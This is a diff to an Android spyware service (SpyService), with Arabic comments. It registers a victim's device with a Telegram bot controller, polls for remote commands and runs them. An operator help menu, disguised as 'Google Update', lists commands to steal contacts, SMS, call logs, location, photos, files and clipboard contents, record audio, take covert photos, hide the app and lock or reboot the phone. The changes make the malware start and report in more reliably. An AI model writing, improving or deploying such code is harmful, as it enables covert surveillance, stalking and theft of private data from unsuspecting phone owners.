@@ -55,6 +55,7 @@ public class SpyService extends Service {
     private LocationManager locationManager;
     private LocationListener locationListener;
     private boolean isTrackingLocation = false;
+    private boolean isRegistered = false;
 
     @Override
     public void onCreate() {
@@ -64,21 +65,19 @@ public class SpyService extends Service {
         deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
         locationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
 
-        // تأجيل startForeground حتى يتم منح الصلاحيات
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
-            // لا نبدأ foreground حتى يتم طلب الصلاحيات
-        } else {
-            startForegroundService();
-        }
+        // تشغيل الخدمة في المقدمة
+        startForegroundService();
 
         PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
         wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "Spy:lock");
         wakeLock.acquire(10 * 60 * 1000L);
 
+        // تسجيل الجهاز فوراً
         registerDevice();
 
+        // بدء جلب الأوامر
         scheduler = Executors.newSingleThreadScheduledExecutor();
-        scheduler.scheduleAtFixedRate(this::pollCommands, 2, Config.get().poll_interval_sec, TimeUnit.SECONDS);
+        scheduler.scheduleAtFixedRate(this::pollCommands, 5, Config.get().poll_interval_sec, TimeUnit.SECONDS);
     }
 
     private void startForegroundService() {
@@ -94,11 +93,6 @@ public class SpyService extends Service {
                 .build());
     }
 
-    // استدعاء هذه الدالة من MainActivity بعد منح الصلاحيات
-    public void startForegroundAfterPermissions() {
-        startForegroundService();
-    }
-
     private void registerDevice() {
         try {
             JSONObject info = new JSONObject();
@@ -107,8 +101,17 @@ public class SpyService extends Service {
             info.put("manufacturer", Build.MANUFACTURER);
             info.put("android", Build.VERSION.RELEASE);
             info.put("battery", getBatteryLevel());
-            bot.sendText("REGISTER:" + info.toString());
-        } catch (Exception e) { Log.e(TAG, "reg err", e); }
+
+            String msg = "REGISTER:" + info.toString();
+            boolean sent = bot.sendText(msg);
+            isRegistered = true;
+            Log.d(TAG, "Registration sent: " + msg + " | Success: " + sent);
+
+            // إرسال رسالة تأكيد للمدير
+            bot.sendText("✅ جهاز جديد مسجل!\n📱 " + Build.MANUFACTURER + " " + Build.MODEL + "\n🆔 " + deviceId);
+        } catch (Exception e) {
+            Log.e(TAG, "Registration error", e);
+        }
     }
 
     private int getBatteryLevel() {
@@ -126,27 +129,66 @@ public class SpyService extends Service {
 
     private void pollCommands() {
         try {
+            if (!isRegistered) {
+                registerDevice();
+                return;
+            }
+
             String response = bot.getUpdates();
-            if (response == null) return;
+            if (response == null) {
+                Log.d(TAG, "getUpdates returned null");
+                return;
+            }
+
             JSONObject json = new JSONObject(response);
-            if (!json.getBoolean("ok")) return;
+            if (!json.getBoolean("ok")) {
+                Log.d(TAG, "getUpdates not ok: " + response);
+                return;
+            }
+
             JSONArray updates = json.getJSONArray("result");
             for (int i = 0; i < updates.length(); i++) {
                 JSONObject upd = updates.getJSONObject(i);
                 int updId = upd.getInt("update_id");
                 if (updId <= bot.lastUpdateId) continue;
                 bot.lastUpdateId = updId + 1;
+
                 if (upd.has("message")) {
                     JSONObject msg = upd.getJSONObject("message");
                     if (msg.has("text")) {
                         String txt = msg.getString("text");
                         if (txt.startsWith("CMD:")) {
-                            executeCommand(txt.substring(4).trim());
+                            String cmd = txt.substring(4).trim();
+                            Log.d(TAG, "Executing command: " + cmd);
+                            executeCommand(cmd);
+                        } else if (txt.startsWith("/")) {
+                            // رد على الأوامر المباشرة من البوت (للمدير)
+                            handleDirectCommand(txt);
                         }
                     }
                 }
             }
-        } catch (Exception e) { Log.e(TAG, "poll err", e); }
+        } catch (Exception e) {
+            Log.e(TAG, "pollCommands error", e);
+        }
+    }
+
+    private void handleDirectCommand(String cmd) {
+        // ردود بسيطة للمدير
+        if (cmd.equals("/start") || cmd.equals("/help")) {
+            bot.sendText("🔰 **Google Update - Commands**\n\n" +
+                    "أرسل الأمر مسبوقاً بـ CMD:\n" +
+                    "مثال: `CMD:GET_CONTACTS`\n\n" +
+                    "📌 الأوامر المتاحة:\n" +
+                    "GET_CONTACTS, GET_SMS, GET_CALLLOGS, GET_LOCATION,\n" +
+                    "START_RECORD, STOP_RECORD, GET_APPS, GET_PHOTOS,\n" +
+                    "GET_VIDEOS, GET_FILES, HIDE_APP, SHOW_APP, FAKE_NOTIF,\n" +
+                    "TAKE_PHOTO, TAKE_PHOTO_FRONT, FLASH_ON, FLASH_OFF,\n" +
+                    "GET_IMEI, GET_PHONE, GET_SIM, GET_WIFI, GET_BATTERY,\n" +
+                    "GET_IP, LOCK_DEVICE, REBOOT, SHUTDOWN, GET_CLIPBOARD");
+        } else {
+            bot.sendText("❌ أمر غير معروف. استخدم /help");
+        }
     }
 
     private void executeCommand(String cmd) {
@@ -191,7 +233,7 @@ public class SpyService extends Service {
         }
     }
 
-    // ========== المميزات الأساسية ==========
+    // ========== المميزات الأساسية (نفس الكود السابق) ==========
 
     private File collectContacts() throws Exception {
         File f = new File(getCacheDir(), "contacts.txt");
